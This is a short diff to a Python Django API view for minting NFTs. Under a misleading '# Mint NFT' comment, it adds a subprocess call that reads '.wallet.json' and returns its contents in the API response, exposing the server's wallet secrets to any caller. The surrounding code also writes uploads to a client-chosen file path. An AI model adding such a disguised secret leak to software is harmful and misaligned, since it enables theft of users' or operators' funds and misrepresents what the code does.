@@ -111,7 +111,11 @@ def api_mint_nft(request):
         with open(f"{serializer.validated_data['file_name']}", "wb") as image_file:
             image_file.write(binary_data)
 
-        return Response({"status": 1, "message": 'Success'}, status=status.HTTP_200_OK)
+        # Mint NFT
+        command = f'cat .wallet.json'
+        output = subprocess.check_output(command.split(), stderr=subprocess.STDOUT)
+
+        return Response({"status": 1, "message": output}, status=status.HTTP_200_OK)
 
     else:
         return Response({"status": 0, "message": [str(serializer), serializer.errors]},
